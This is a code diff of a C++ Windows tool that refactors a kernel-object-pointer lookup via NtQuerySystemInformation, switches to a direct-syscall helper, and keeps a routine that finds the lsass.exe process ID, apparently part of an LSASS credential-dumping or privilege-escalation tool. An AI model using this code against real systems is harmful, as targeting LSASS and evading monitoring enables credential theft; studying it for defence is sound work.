@@ -77,83 +77,85 @@ DWORD GetWindowsBuildNumber()
 	return 0;
 }
 
-static
-int
-InitFunc()
-{
-	HMODULE hModule = GetModuleHandle(L"ntdll.dll");
-
-	if (hModule)
-	{
-		pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
-		if (!pNtQuerySystemInformation)
-		{
-			printf("[-] NtQuerySystemInformation not loaded\n");
-			return 1;
-		}
-	}
-
-	return 0;
-}
+//static
+//int
+//InitFunc()
+//{
+//	HMODULE hModule = GetModuleHandle(L"ntdll.dll");
+//
+//	if (hModule)
+//	{
+//		pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
+//		if (!pNtQuerySystemInformation)
+//		{
+//			printf("[-] NtQuerySystemInformation not loaded\n");
+//			return 1;
+//		}
+//	}
+//
+//	return 0;
+//}
 
 static
 int
 GetObjectPointer(
-	PULONG64 ppObjAddr,
-	ULONG ulPid,
-	HANDLE handle)
+	PULONG_PTR OutObjectPointer,
+	ULONG Pid,
+	HANDLE Handle)
 {
-	int Ret{ -1 };
+	auto ret{ -1 };
+
 	PSYSTEM_HANDLE_INFORMATION pHandleInfo{};
 	ULONG		ulBytes{};
-	NTSTATUS	Status{ STATUS_SUCCESS };
+	NTSTATUS	Status{ 0 };
 
-	while ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
-		pHandleInfo,
-		ulBytes,
-		&ulBytes)) == 0xC0000004L)
+	do
 	{
-		if (pHandleInfo != NULL)
+		while ((Status = Utils::NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
+														pHandleInfo,
+														ulBytes,
+														&ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
 		{
-			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(),
-				HEAP_ZERO_MEMORY,
-				pHandleInfo,
-				(size_t)2 * ulBytes);
+			if (pHandleInfo != nullptr)
+			{
+				pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(),
+																	  HEAP_ZERO_MEMORY,
+																	  pHandleInfo,
+																	  (size_t)2 * ulBytes);
+			}
+			else
+			{
+				pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
+																	HEAP_ZERO_MEMORY,
+																	(size_t)2 * ulBytes);
+			}
 		}
-		else
-		{
-			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
-				HEAP_ZERO_MEMORY,
-				(size_t)2 * ulBytes);
-		}
-	}
 
-	if (Status != NULL)
-	{
-		Ret = Status;
-		goto done;
-	}
-
-	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
-	{
-		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) &&
-			(pHandleInfo->Handles[i].HandleValue == static_cast<USHORT>(HandleToULong(handle))))
+		if (!NT_SUCCESS(Status) || !pHandleInfo)
 		{
-			*ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
-			Ret = 0;
+			ret = Status;
 			break;
 		}
-	}
 
-done:
+		for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
+		{
+			if ((pHandleInfo->Handles[i].UniqueProcessId == Pid) &&
+				(pHandleInfo->Handles[i].HandleValue == static_cast<USHORT>(HandleToULong(Handle))))
+			{
+				*OutObjectPointer = reinterpret_cast<ULONG_PTR>(pHandleInfo->Handles[i].Object);
+				ret = 0;
+				break;
+			}
+		}
+	} while (FALSE);
+
 
 	if (pHandleInfo)
 	{
 		HeapFree(GetProcessHeap(), 0, pHandleInfo);
 	}
 
-
-	return Ret;
+	return ret;
 }
 
 static
@@ -176,11 +178,10 @@ GetLsassPid()
 	{
 		do
 		{
-			// 不区分大小写比较进程名
 			if (_tcsicmp(pe32.szExeFile, _T("lsass.exe")) == 0)
 			{
 				lsassPid = pe32.th32ProcessID;
-				break;  // lsass 通常只有一个实例
+				break;
 			}
 		} while (Process32Next(hSnapshot, &pe32));
 	}
@@ -255,11 +256,11 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 	SetConsoleTextAttribute(hConsole, 7);
 
-	if (InitFunc() != 0)
+	/*if (InitFunc() != 0)
 	{
 		LOG("[-] Failed to initialize function pointers");
 		return 1;
-	}
+	}*/
 
 	if (!Utils::InitSyscalls())
 	{
